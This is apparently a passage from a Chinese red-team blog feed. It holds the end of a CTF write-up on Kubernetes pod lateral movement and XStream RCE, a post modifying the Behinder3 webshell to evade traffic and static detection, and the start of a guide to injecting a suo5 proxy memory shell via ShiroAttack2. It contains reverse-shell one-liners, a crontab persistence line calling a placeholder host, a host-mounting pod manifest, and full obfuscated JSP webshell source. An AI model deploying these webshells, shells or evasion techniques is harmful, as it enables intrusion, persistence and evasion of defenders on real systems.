<pre><code class="language-bash">curl -s -k -H &quot;Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6InNUSExVVHNuaVBocTN5eU1mWEtlbTdNRUlzLVRhblM5dDhiZmJuSlJ1d1EifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI5MTA2NjAxLCJpYXQiOjE2OTc1NzA2MDEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJ3ZWItYXBwLTc3ZmJmNjU3NmItcDR3eGQiLCJ1aWQiOiJlODZiM2I4Zi1iNzlmLTRjMDctODBjZS01Zjk2MmYwOTE0MmQifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6IndlYi1hcHAtc2EiLCJ1aWQiOiJlM2JiOGI4MC02NDk5LTQ1MWItOGZmYi1kNDczMzc0NGQ2MGYifSwid2FybmFmdGVyIjoxNjk3NTc0MjA4fSwibmJmIjoxNjk3NTcwNjAxLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDp3ZWItYXBwLXNhIn0.WtbuPrZpCvttzmBY8BJXzThzBtivxf8GboxNYwpPsMN0XYF5EtA1aGs1hWAWI4zupeV5z-XZWOeulDrkXIB6e1qiMVFvdAZXH6S0O79GlIOd9PwPNgPHDmn3d0Lm1zNFjJN6RVHI50ZvFfZt3W0YuGGnPfEjbX536TWA0DrARV94q976-PtwObjuW-Ef03KRNwTsKCU7x6CoviVidNefwlGmw0w8rkO96dJJqLp97rScy615XkaUrSuT0iHnjXy4iBrXZINcJxSt4SpgKdIdli749YjzN3ivU-iGdbsi6q5S6tehGqAvHJUSdqNOerNhcL0T1eGHcaxBmwAFevzYcA&quot; https://10.96.0.1/api/v1/namespaces/default/pods
</code></pre>
<figure data-type="image" tabindex="69"><img src="https://p.ipic.vip/fo4s9r.png" alt="img" loading="lazy"></figure>
<p>查看下这个pod的详细信息,发现信息：</p>
<pre><code class="language-bash">curl -s -k -H &quot;Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6InNUSExVVHNuaVBocTN5eU1mWEtlbTdNRUlzLVRhblM5dDhiZmJuSlJ1d1EifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI5MTA2NjAxLCJpYXQiOjE2OTc1NzA2MDEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJ3ZWItYXBwLTc3ZmJmNjU3NmItcDR3eGQiLCJ1aWQiOiJlODZiM2I4Zi1iNzlmLTRjMDctODBjZS01Zjk2MmYwOTE0MmQifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6IndlYi1hcHAtc2EiLCJ1aWQiOiJlM2JiOGI4MC02NDk5LTQ1MWItOGZmYi1kNDczMzc0NGQ2MGYifSwid2FybmFmdGVyIjoxNjk3NTc0MjA4fSwibmJmIjoxNjk3NTcwNjAxLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDp3ZWItYXBwLXNhIn0.WtbuPrZpCvttzmBY8BJXzThzBtivxf8GboxNYwpPsMN0XYF5EtA1aGs1hWAWI4zupeV5z-XZWOeulDrkXIB6e1qiMVFvdAZXH6S0O79GlIOd9PwPNgPHDmn3d0Lm1zNFjJN6RVHI50ZvFfZt3W0YuGGnPfEjbX536TWA0DrARV94q976-PtwObjuW-Ef03KRNwTsKCU7x6CoviVidNefwlGmw0w8rkO96dJJqLp97rScy615XkaUrSuT0iHnjXy4iBrXZINcJxSt4SpgKdIdli749YjzN3ivU-iGdbsi6q5S6tehGqAvHJUSdqNOerNhcL0T1eGHcaxBmwAFevzYcA&quot; https://10.96.0.1/api/v1/namespaces/default/pods/utility-pod-7bf9988594-x9ls4
</code></pre>
<figure data-type="image" tabindex="70"><img src="https://p.ipic.vip/gonhcw.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="71"><img src="https://p.ipic.vip/4so2mw.png" alt="img" loading="lazy"></figure>
<p>Flag2 和Flag3 都在这个pod里，所以我们的目的就是横向到这个pod</p>
<figure data-type="image" tabindex="72"><img src="https://p.ipic.vip/njx4v1.png" alt="img" loading="lazy"></figure>
<ul>
<li>下载kubectl到pod中,直接指定信息操作</li>
</ul>
<p>通过命令指定token以及对应的api的地址,进行远程操控pod.横向到目标pod即可:</p>
<ul>
<li>查看POD</li>
</ul>
<pre><code class="language-bash">kubectl get pods --server=https://&lt;api-server-url&gt; --token=&lt;Service Account Token&gt; 
</code></pre>
<ul>
<li>操作POD:</li>
</ul>
<pre><code class="language-ba">kubectl exec -it utility-pod  bash --server=https://&lt;api-server-url&gt; --token=&lt;Service Account Token&gt; 
</code></pre>
<figure data-type="image" tabindex="73"><img src="https://p.ipic.vip/a0162p.png" alt="img" loading="lazy"></figure>
<p>后续可以继续利用,权限足够的话:</p>
<p>创建特权pod 挂载实体机/ 到 特权pod的 /mnt</p>
<pre><code class="language-bash">kubectl apply -f app.yaml  --server=https://&lt;api-server-url&gt; --token=&lt;Service Account Token&gt;
</code></pre>
<ul>
<li>app.yaml</li>
</ul>
<pre><code class="language-yaml">apiVersion: v1

kind: Pod

metadata:

  name: app

spec:

  containers:

  - image: nginx

    name: test-container

    volumeMounts:

    - mountPath: /mnt

      name: test-volume

  volumes:

  - name: test-volume

    hostPath:

      path: /

</code></pre>
<p>进入我们创建的特权token 进/mnt 目录</p>
<ul>
<li>kubectl  exec -it app /bin/bash --server=https://<api-server-url> --token=<Service Account Token></li>
</ul>
<p>后渗透:</p>
<pre><code>// 1. 向 crontab 写入反弹 shell 的定时任务

# echo -e &quot;* * * * * root bash -i &gt;&amp; /dev/tcp/x.x.x.x/8888 0&gt;&amp;1n&quot; &gt;&gt; /mnt/etc/crontab

// 2. 写入SSH公钥直接连接：

echo &quot;ssh-rsa 123&quot; &gt;&gt; /mnt/root/.ssh/authorized_keys

</code></pre>
<h2 id="题目六-环环相扣">题目六 环环相扣</h2>
<h3 id="题目信息-6">题目信息：</h3>
<p>某个应用的备份文件存在泄漏，泄漏在了COS上，已知信息如下：</p>
<p>服务商: 腾讯云</p>
<p>前缀: backupdata-1318326636</p>
<p>位置：ap-shanghai</p>
<p>文件名：app-pom.xml</p>
<p>Xstream</p>
<p>RCE</p>
<p>Docker</p>
<h3 id="解题步骤包含关键步骤截图-6">解题步骤（包含关键步骤截图：）</h3>
<p>通过题目的提示我们能猜出目标的COS地址：</p>
<p>https://backupdata-1318326636.cos.ap-shanghai.myqcloud.com/</p>
<figure data-type="image" tabindex="74"><img src="https://p.ipic.vip/1m8qd5.png" alt="img" loading="lazy"></figure>
<p>根据提示构造下文件名,获取到文件内容，注释包含一个IP，看文件接口是java系统的Mvn的pom.xml文件：</p>
<p>从配置文件获取的 依赖有springBoot以及Xstream</p>
<figure data-type="image" tabindex="75"><img src="https://p.ipic.vip/l2xpcp.png" alt="img" loading="lazy"></figure>
<p>端口扫描下注释里的IP地址：</p>
<figure data-type="image" tabindex="76"><img src="https://p.ipic.vip/dp529v.png" alt="img" loading="lazy"></figure>
<p>访问端口8080：</p>
<p>随便构造一个xml 爆500 猜测可能直接是通过Content-Type来直接解析xml：</p>
<figure data-type="image" tabindex="77"><img src="https://p.ipic.vip/ng0h1q.png" alt="img" loading="lazy"></figure>
<p>再搜索下xstream 1.4.15 存在哪些漏洞，获取的信息如下：</p>
<figure data-type="image" tabindex="78"><img src="https://p.ipic.vip/97n5nk.png" alt="img" loading="lazy"></figure>
<p>符合版本的漏洞如下：</p>
<p>| XStream 远程代码执行漏洞 | <a href="https://x-stream.github.io/CVE-2021-21344.html">CVE-2021-21344</a> | <code>XStream</code>: &lt;= 1.4.15 |</p>
<p>| ------------------------ | ------------------------------------------------------------ | -------------------- |</p>
<p>| XStream 远程代码执行漏洞 | <a href="https://x-stream.github.io/CVE-2021-21345.html">CVE-2021-21345</a> | <code>XStream</code>: &lt;= 1.4.15 |</p>
<p>| XStream 远程代码执行漏洞 | <a href="https://x-stream.github.io/CVE-2021-21346.html">CVE-2021-21346</a> | <code>XStream</code>: &lt;= 1.4.15 |</p>
<p>| XStream 远程代码执行漏洞 | <a href="https://x-stream.github.io/CVE-2021-21347.html">CVE-2021-21347</a> | <code>XStream</code>&lt;= 1.4.15   |</p>
<p>| XStream 远程代码执行漏洞 | <a href="https://x-stream.github.io/CVE-2021-21350.html">CVE-2021-21350</a> | <code>XStream</code>: &lt;= 1.4.15 |</p>
<p>| XStream 远程代码执行漏洞 | <a href="https://x-stream.github.io/CVE-2021-21351.html">CVE-2021-21351</a> | <code>XStream</code>: &lt;= 1.4.15 |</p>
<p>| XStream 远程代码执行漏洞 | <a href="https://x-stream.github.io/CVE-2021-29505.html">CVE-2021-29505</a> | <code>XStream</code>: &lt;= 1.4.16 |</p>
<p>我们尝试了几个，发现CVE-2021-21351 可以利用, 打JNDI 利用链使用spring依赖的</p>
<figure data-type="image" tabindex="79"><img src="https://p.ipic.vip/wborub.png" alt="img" loading="lazy"></figure>
<p>通过python3来反弹shell：</p>
<pre><code class="language-python">python3 -c 'import os,pty,socket;s=socket.socket();s.connect((&quot;xxxxxx&quot;,9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/bash&quot;)'

</code></pre>
<p>反弹成功，获取第二个flag</p>
<figure data-type="image" tabindex="80"><img src="https://p.ipic.vip/he4ruq.png" alt="img" loading="lazy"></figure>
<p>信息收集 本机docker有Flag3：</p>
<figure data-type="image" tabindex="81"><img src="https://p.ipic.vip/7l3usc.png" alt="img" loading="lazy"></figure>
<p>进入docker获取flag3:</p>
<figure data-type="image" tabindex="82"><img src="https://p.ipic.vip/v273bu.png" alt="img" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[红队开发: Behinder3-Beta11 实战下的二次开发 （4）]]></title>
        <id>https://1oecho.github.io/behinder3-beta11-shi-zhan-xia-de-er-ci-kai-fa/</id>
        <link href="https://1oecho.github.io/behinder3-beta11-shi-zhan-xia-de-er-ci-kai-fa/">
        </link>
        <updated>2023-11-21T09:30:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x00-实战问题">0x00 实战问题</h2>
<ul>
<li>猜测微步流量检测的实现原理</li>
</ul>
<figure data-type="image" tabindex="1"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141250545.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141250545.png" alt="img" loading="lazy"></a></figure>
<h3 id="需要解决的问题">需要解决的问题：</h3>
<ol>
<li>请求体的数据传递方式 需要对webshell进行修改，为适配不做修改 （未实现）</li>
</ol>
<p><em><strong>*原*</strong></em>：AES+Base64</p>
<p><em><strong>*改*</strong></em>：AES+Base64 嵌入到 正常 的数据包中，伪造数据包</p>
<ol>
<li>返回体的数据传输方式</li>
</ol>
<p><em><strong>*原*</strong></em>：AES</p>
<p><em><strong>*改*</strong></em>：AES+Base64+拼接字符串头 潜入到正常数据包中，伪造json数据包</p>
<ol>
<li>避免数据包格式单一，被安全设备捕捉特征</li>
</ol>
<h2 id="0x02-数据传输">0x02 数据传输</h2>
<ul>
<li>请求参数：参数传递修改为伪造Json格式 （未实现，需要修改webshell，现有所有工具都为原版）</li>
</ul>
<pre><code class="language-java">{Encoded: &quot;asdasdasdas&quot;}

复制代码
</code></pre>
<ul>
<li>返回包参数：接受参数时，伪造为加密json</li>
</ul>
<pre><code class="language-java">{ Result: &quot;daddasdadasda&quot; }

复制代码
</code></pre>
<h2 id="0x02-代码实现">0x02 代码实现</h2>
<p>原版返回数据为AES加密数据流，未进行Base64，我们构造成base64+随机数据</p>
<figure data-type="image" tabindex="2"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251422.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251422.png" alt="img" loading="lazy"></a></figure>
<p>数据解码时增加解码步骤：</p>
<figure data-type="image" tabindex="3"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251361.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251361.png" alt="img" loading="lazy"></a></figure>
<ul>
<li>客户端数据包处理过程</li>
</ul>
<figure data-type="image" tabindex="4"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251680.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251680.png" alt="img" loading="lazy"></a></figure>
<ul>
<li>修改功能函数，返回数据类型，所有都要修改</li>
</ul>
<figure data-type="image" tabindex="5"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251375.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251375.png" alt="img" loading="lazy"></a></figure>
<ul>
<li>修改Utils取数据时的方法，客户端只取我们需要的数据, 测试发现有些容器有些问题，修改为通用方式</li>
</ul>
<figure data-type="image" tabindex="6"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251314.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251314.png" alt="img" loading="lazy"></a></figure>
<figure data-type="image" tabindex="7"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251853.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251853.png" alt="img" loading="lazy"></a></figure>
<h2 id="0x03-静态查杀绕过">0x03 静态查杀绕过</h2>
<ul>
<li>通过不断注释原版webshell代码，定位到主要原因为base64解码和数据包加解密关键字/do.final问题</li>
</ul>
<p>通过反射重新实现加密逻辑，将关键字通过byte[]进行绕过，所有关键字通过反射加载实现</p>
<p>base通过反射+byte[] 兼容各版本jdk，避免高低版本解码问题</p>
<pre><code class="language-java">&lt;%!class U extends ClassLoader{U(ClassLoader c)
{super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}
    public static byte[] s(String bs) throws Exception {
        byte[] value = null;
        Class a;
        try {
            a = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 66, 97, 115, 101, 54, 52}));
            Object b = a.getMethod(new String(new byte[]{103, 101, 116, 68, 101, 99, 111, 100, 101, 114}), (Class[])null).invoke(a, (Object[])null);
            value = (byte[]) b.getClass().getMethod(new String(new byte[]{100, 101, 99, 111, 100, 101}), String.class).invoke(b, bs);
        } catch (Exception var6) {
            try {
                a = Class.forName(new String(new byte[]{}));
                Object c = a.newInstance();
                value = (byte[]) c.getClass().getMethod(new String(new byte[]{100, 101, 99, 111, 100, 101, 66, 117, 102, 102, 101, 114}), String.class).invoke(c, bs);
            } catch (Exception var5) {
            }
      }
        return value;
    }
%&gt;
&lt;%if (request.getMethod().equals(&quot;POST&quot;))
    {
        String json =&quot;e45e329feb5d925b&quot;;
        session.putValue(&quot;u&quot;,json);
        String xo = new String(new byte[]{106, 97, 118, 97, 120, 46, 99, 114, 121, 112, 116, 111, 46, 67, 105, 112, 104, 101, 114});
        Class ci = Class.forName(xo);
        java.lang.reflect.Method g = ci.getMethod(new String(new byte[]{103, 101, 116, 73, 110, 115, 116, 97, 110, 99, 101}), String.class);
        Object c = ci.cast(g.invoke((null),new String(new byte[]{65, 69, 83})));
        ci.getMethod(new String(new byte[]{105, 110, 105, 116}),int.class,java.security.Key.class).invoke(c,2,new javax.crypto.spec.SecretKeySpec(json.getBytes(),new String(new byte[]{65, 69, 83})));
        try {
            String ok = request.getReader().readLine();
            byte [] x = (byte[]) c.getClass().getMethod(new String(new byte[]{100, 111, 70, 105, 110, 97, 108}),byte[].class).invoke(c,s(ok));
            ClassLoader sb = this.getClass().getClassLoader();
            new U(sb).g(x).newInstance().equals(pageContext);
        } catch (Exception e) {
            out.print(e.toString());
        }
    }
%&gt;
</code></pre>
<ul>
<li>实战环境原版jsp编译为class时，存在各种问题，我们通过类加载definclass的方式对webshell逻辑进行修改</li>
</ul>
<p>通过javassist进行生成字节码，后续直接反射调用即可</p>
<ul>
<li>webshell逻辑不变</li>
</ul>
<figure data-type="image" tabindex="8"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251610.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251610.png" alt="img" loading="lazy"></a></figure>
<ul>
<li>javassist生成字节码base64</li>
</ul>
<figure data-type="image" tabindex="9"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251852.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251852.png" alt="img" loading="lazy"></a></figure>
<ul>
<li>jsp实现逻辑：</li>
</ul>
<figure data-type="image" tabindex="10"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251049.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251049.png" alt="img" loading="lazy"></a></figure>
<pre><code class="language-java">&lt;%@page import=&quot;java.util.*&quot;%&gt;

&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}

    public Class g(byte []b){return super.defineClass(b,0,b.length);}}

    public static byte[] s(String bs) throws Exception {

        byte[] value = null;

        Class a;

        try {

            a = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 66, 97, 115, 101, 54, 52}));

            Object b = a.getMethod(new String(new byte[]{103, 101, 116, 68, 101, 99, 111, 100, 101, 114}), (Class[])null).invoke(a, (Object[])null);

            value = (byte[]) b.getClass().getMethod(new String(new byte[]{100, 101, 99, 111, 100, 101}), String.class).invoke(b, bs);

        } catch (Exception var6) {

            try {

                a = Class.forName(new String(new byte[]{}));

                Object c = a.newInstance();

                value = (byte[]) c.getClass().getMethod(new String(new byte[]{100, 101, 99, 111, 100, 101, 66, 117, 102, 102, 101, 114}), String.class).invoke(c, bs);

            } catch (Exception var5) {

            }

        }

        return value;

    }

%&gt;

&lt;%if (request.getMethod().equals(&quot;POST&quot;)){

    String data =&quot;yv66vgAAADQAhAcASwoAAQBMCgAJAE0HAE4KAAkATwcAUAoAUQBSCgAKAFMHAFQHAFUHAC8HAFYKAAkAVwoAGwBYCgAbAFkKABsAWgcAWwoAEQBcCABdCgBeAF8HAGAKAAEAYQoAFQBiCgBeAGMKABoAZAcAZQcAZgoAGgBYCgBeAGcKABoAaAoACgBpAQABcwEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQABYgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAAWEBABFMamF2YS9sYW5nL0NsYXNzOwEAAWMBAAR2YXI2AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQACYnMBABJMamF2YS9sYW5nL1N0cmluZzsBAAV2YWx1ZQEAAltCAQANU3RhY2tNYXBUYWJsZQcASwcAVgEACkV4Y2VwdGlvbnMBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABHRoaXMBAAhMY29uZmlnOwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQADKClWAQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAAnR0AQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQABawEAAXABAAtwYWdlQ29udGV4dAEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAAXgBAAFlAQADb2JqAQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAKUxqYXZhL3V0aWwvQXJyYXlMaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQAKU291cmNlRmlsZQEAC2NvbmZpZy5qYXZhAQAQamF2YS9sYW5nL1N0cmluZwwANABqDABrAGwBABJbTGphdmEvbGFuZy9DbGFzczsMAG0AbgEAE1tMamF2YS9sYW5nL09iamVjdDsHAG8MAHAAcQwAcgBzAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAHQAdQwANAA1DAA0ADkMAHYAdwEAE2phdmEvdXRpbC9BcnJheUxpc3QMAHgAeQEAA0FFUwcAegwAewB8AQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwAfQB+DAA0AH8MAIAAgQwAIAAhAQAGY29uZmlnAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyDACCAIMMADoAOwwAPAA9AQAFKFtCKVYBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAA2dldAEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCACEAGgAbAAAAAAAFAAkAIAAhAAIAIgAAAmsABwAFAAABmgFMuwABWRAQvAhZAxBqVFkEEGFUWQUQdlRZBhBhVFkHEC5UWQgQdVRZEAYQdFRZEAcQaVRZEAgQbFRZEAkQLlRZEAoQQlRZEAsQYVRZEAwQc1RZEA0QZVRZEA4QNlRZEA8QNFS3AAK4AANNLLsAAVkQCrwIWQMQZ1RZBBBlVFkFEHRUWQYQRFRZBxBlVFkIEGNUWRAGEG9UWRAHEGRUWRAIEGVUWRAJEHJUtwACAcAABLYABSwBwAAGtgAHTi22AAi7AAFZEAa8CFkDEGRUWQQQZVRZBRBjVFkGEG9UWQcQZFRZCBBlVLcAAgS9AAlZAxIBU7YABS0EvQAKWQMqU7YAB8AAC8AAC0ynAI9OuwABWQO8CLcAArgAA00stgANOgQZBLYACLsAAVkQDLwIWQMQZFRZBBBlVFkFEGNUWQYQb1RZBxBkVFkIEGVUWRAGEEJUWRAHEHVUWRAIEGZUWRAJEGZUWRAKEGVUWRALEHJUtwACBL0ACVkDEgFTtgAFGQQEvQAKWQMqU7YAB8AAC8AAC0ynAAU6BCuwAAIAAgEJAQwADAENAZMBlgAMAAMAIwAAADIADAAAAAgAAgALAGsADAC9AA0BCQAVAQwADgENABABGwARASEAEgGTABQBlgATAZgAFgAkAAAASAAHAL0ATAAlACYAAwBrAKEAJwAoAAIBIQByACkAJgAEARsAewAnACgAAgENAIsAKgArAAMAAAGaACwALQAAAAIBmAAuAC8AAQAwAAAAKQAD/wEMAAIHADEHAAsAAQcAMv8AiQAEBwAxBwALAAcAMgABBwAy+QABADMAAAAEAAEADAABADQANQABACIAAAA6AAIAAgAAAAYqK7cADrEAAAACACMAAAAGAAEAAAAYACQAAAAWAAIAAAAGADYANwAAAAAABgApADgAAQABADQAOQABACIAAAAvAAEAAQAAAAUqtwAPsQAAAAIAIwAAAAYAAQAAABkAJAAAAAwAAQAAAAUANgA3AAAAAQA6ADsAAQAiAAAAPQAEAAIAAAAJKisDK763ABCwAAAAAgAjAAAABgABAAAAGwAkAAAAFgACAAAACQA2ADcAAAAAAAkAJQAvAAEAAQA8AD0AAQAiAAABPAAGAAgAAABtK8AAEU0sA7YAEsAAAU4sBLYAEsAAAToELAW2ABI6BRITuAAUOgYZBgW7ABVZLbYAFhITtwAXtgAYGQS4ABk6B7sAGlksBrYAEsAAG7cAHBkGGQe2AB22AB62AA0sBbYAErYAH1enAAZNA6wErAABAAAAZQBoAAwABAAjAAAAMgAMAAAAIAAFACEADgAiABgAIwAfACQAJgAlADkAJgBAACcAZQAqAGgAKABpACkAawArACQAAABcAAkABQBgAD4APwACAA4AVwBAAC0AAwAYAE0AQQAtAAQAHwBGAEIAJgAFACYAPwApAEMABgBAACUARAAvAAcAaQACAEUAKwACAAAAbQA2ADcAAAAAAG0ARgAmAAEARwAAAAwAAQAFAGAAPgBIAAIAMAAAAAkAAvcAaAcAMgIAAQBJAAAAAgBK&quot;;

    String k =&quot;e45e329feb5d925b&quot;;

    session.putValue(&quot;u&quot;,k);

    String p=request.getReader().readLine();

    ArrayList&lt;Object&gt; t = new ArrayList&lt;Object&gt;();

    t.add(k); // 传入解密的key

    t.add(p); // 传入请求数据包

    t.add(pageContext); // 传入pageContext对象

    t.add(this.getClass().getClassLoader()); // 对应的classLoader

    new U(this.getClass().getClassLoader()).g(s(data)).newInstance().equals(t);}

    //out.print(&quot;It Works!&quot;);

%&gt;
</code></pre>
<h2 id="0x04-实现效果">0x04 实现效果</h2>
<ul>
<li>返回包实现效果：</li>
</ul>
<figure data-type="image" tabindex="11"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251439.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251439.png" alt="img" loading="lazy"></a></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ShiroAttack2：内存马-SUO5正向代理]]></title>
        <id>https://1oecho.github.io/-rcF0EfVN/</id>
        <link href="https://1oecho.github.io/-rcF0EfVN/">
        </link>
        <updated>2023-04-21T10:06:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x01-工具参考">0x01 工具参考</h2>
<p>https://github.com/zema1/suo5 - 一款高性能 HTTP 代理隧道工具</p>
<figure data-type="image" tabindex="1"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852613.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852613.png" alt="image-20230402185208575" loading="lazy"></a></figure>
<h2 id="0x02-代码实现">0x02 代码实现</h2>
<h3 id="01-获取代码">01 获取代码</h3>
<p>suo5 工具大佬提供了Filter的代码，直接拿来使用即可，</p>
<ul>
<li>https://github.com/zema1/suo5/tree/main/assets</li>
</ul>
<figure data-type="image" tabindex="2"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021905213.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021905213.png" alt="image-20230402190540195" loading="lazy"></a></figure>
<h3 id="02-修改shiroattack2">02 修改ShiroAttack2</h3>
<p>分析了下Shiro_Attack注入内存马的过程，直接开始修改，过程如下：</p>
<ul>
<li>第一步，直接在<code>src/main/java/com/summersec/x</code>找一个原有的Filter复制修改下类名，为了好区分起名<code>SUO5Filter</code>，补充所有方法和定义的变量，修改<code>Suo5Filter#doFilter</code>，补充调用到的函数和方法，以及变量即可。因为实际注入只需要接受path参数，pwd那些其他的删掉就行：</li>
</ul>
<pre><code class="language-java">public void doFilter(ServletRequest sReq, ServletResponse sResp, FilterChain chain) throws IOException, ServletException {

        HttpServletRequest request = (HttpServletRequest) sReq;
        HttpServletResponse response = (HttpServletResponse) sResp;

        // 自己增加一个建立链接的判断
        if (request.getHeader(&quot;Proxy&quot;).equals(&quot;UP&quot;)){ 
        String agent = request.getHeader(&quot;User-Agent&quot;);
        String contentType = request.getHeader(&quot;Content-Type&quot;);

        // 建立代理的代码实际修改就可以，我就直接拿来使用了，注意服务端和客户端要对应
        if (agent == null || !agent.equals(&quot;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3&quot;)) {
            if (chain != null) {
                chain.doFilter(sReq, sResp);
            }
            return;
        }
        if (contentType == null) {
            return;
        }

        try {
            if (contentType.equals(&quot;application/plain&quot;)) {
                tryFullDuplex(request, response);
                return;
            }

            if (contentType.equals(&quot;application/octet-stream&quot;)) {
                processDataBio(request, response);
            } else {
                processDataUnary(request, response);
            }
        } catch (Throwable e) {
        }
        } else {
            response.setStatus(404);
            response.setHeader(&quot;Vary&quot;,&quot;No&quot;);
        }

        chain.doFilter(sReq, sResp);
    }
复制代码
</code></pre>
<ul>
<li>第二步，通过自带的 <code>com/summersec/attack/deser/plugins/servlet/MemBytes.java</code>来生成我们修改好的Class，后续加载进去，增加一个新的值即可，Key是自己定义的名字后续调用时使用，Value是我们新增的Class的类名：</li>
</ul>
<figure data-type="image" tabindex="3"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852127.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852127.png" alt="img" loading="lazy"></a></figure>
<ul>
<li>第三步，生成SuoFilter的Base64编码的字节码，有自带的方法直接用就行：</li>
</ul>
